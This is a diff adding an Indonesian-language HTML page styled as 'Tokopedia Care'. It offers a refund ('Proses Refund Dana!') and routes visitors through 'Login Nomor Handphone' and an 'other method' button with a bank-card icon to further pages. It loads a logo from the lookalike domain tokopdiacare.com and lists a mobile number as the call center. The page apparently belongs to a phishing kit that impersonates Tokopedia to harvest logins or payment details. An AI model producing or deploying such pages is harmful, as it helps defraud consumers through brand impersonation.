@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Tokopedia Care</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      margin: 0;
+      background: #fff;
+      color: #000;
+      text-align: center;
+    }
+    .top-logo {
+      background: #1f1f1f;
+      padding: 10px;
+    }
+    .top-logo img {
+      height: 30px;
+    }
+    .green-header {
+      background: #00b900;
+      padding: 20px 0;
+    }
+    .green-header img {
+      height: 30px;
+    }
+    h2 {
+      color: #03AC0E;
+      font-size: 20px;
+      margin-top: 20px;
+    }
+    .desc {
+      font-size: 14px;
+      padding: 0 30px;
+      line-height: 1.5;
+    }
+    .desc-red {
+      color: #D93025;
+      font-weight: bold;
+      margin-top: 15px;
+      margin-bottom: 20px;
+    }
+    .btn {
+      width: 85%;
+      max-width: 350px;
+      padding: 14px;
+      margin: 12px auto;
+      border-radius: 10px;
+      font-size: 16px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      font-weight: bold;
+    }
+    .btn-login {
+      background: #00b900;
+      color: #fff;
+      border: none;
+    }
+    .btn-alt {
+      background: #fff;
+      color: #000;
+      border: 2px solid #00b900;
+    }
+    .btn-alt img {
+      height: 20px;
+      margin-right: 8px;
+    }
+    .loading {
+      display: none;
+      margin-top: 10px;
+      font-size: 14px;
+      color: #00b900;
+      font-weight: bold;
+    }
+    .dot-typing {
+      display: inline-block;
+      overflow: hidden;
+      vertical-align: bottom;
+      width: 1em;
+      animation: typing 1.5s steps(3, end) infinite;
+    }
+    @keyframes typing {
+      0% { width: 0 }
+      100% { width: 1em }
+    }
+    .icons {
+      display: flex;
+      justify-content: center;
+      margin: 20px 0;
+      gap: 20px;
+    }
+    .icons img {
+      width: 40px;
+    }
+    .icon-label {
+      font-size: 12px;
+      margin-top: 5px;
+    }
+    .footer {
+      font-size: 13px;
+      padding: 10px 30px;
+    }
+    .green {
+      color: #03AC0E;
+      font-weight: bold;
+    }
+  </style>
+  <script>
+    function login() {
+      const loadingText = document.getElementById("loading");
+      loadingText.style.display = "block";
+      setTimeout(() => {
+        window.location.href = "hp.html";
+      }, 1500);
+    }
+
+    function metodeLain() {
+      const loadingText = document.getElementById("loading");
+      loadingText.style.display = "block";
+      setTimeout(() => {
+        window.location.href = "yoge.html";
+      }, 1500);
+    }
+  </script>
+</head>
+<body>
+
+  <div class="top-logo">
+    <img src="https://tokopdiacare.com/gallery/1000135361-3.png?ts=1749869290" alt="Top Logo">
+  </div>
+
+  <div class="green-header">
+    <img src="https://logodix.com/logo/2205838.gif" alt="Tokopedia Shop">
+  </div>
+
+  <h2>Selamat Datang Topres?</h2>
+  <p class="desc">Ada yang bisa kami bantu?<br>Masuk untuk mendapatkan bantuan<br>Terkait transaksi di Tokopedia</p>
+  <div class="desc-red">Proses Refund Dana!</div>
+
+  <div class="btn btn-login" onclick="login()"> Login Nomor Handphone</div>
+  <div id="loading" class="loading">Memproses<span class="dot-typing">...</span></div>
+
+  <div class="btn btn-alt" onclick="metodeLain()">
+    <img src="https://img.icons8.com/ios-filled/50/000000/bank-card-back-side.png" alt="Kartu"> Gunakan Metode Lain
+  </div>
+
+  <div class="icons">
+    <div>
+      <img src="https://img.icons8.com/ios/50/security-checked.png" alt="Keamanan">
+      <div class="icon-label">Akun &<br>Keamanan</div>
+    </div>
+    <div>
+      <img src="https://img.icons8.com/ios/50/complaint.png" alt="Pelaporan">
+      <div class="icon-label">Pelaporan</div>
+    </div>
+    <div>
+      <img src="https://img.icons8.com/ios/50/shopping-cart--v1.png" alt="Pesanan">
+      <div class="icon-label">Pesanan</div>
+    </div>
+    <div>
+      <img src="https://img.icons8.com/ios/50/more.png" alt="Lainnya">
+      <div class="icon-label">Lainnya</div>
+    </div>
+  </div>
+
+  <div class="footer">
+    <p>Layanan Pengaduan Konsumen <span class="green">PT.Tokopedia</span></p>
+    <p>Call Center: 08154037098</p>
+    <p>Direktorat Jenderal Perlindungan Konsumen & Tertib Niaga Kementerian Perdagangan Republik Indonesia</p>
+  </div>
+
+</body>
+</html>
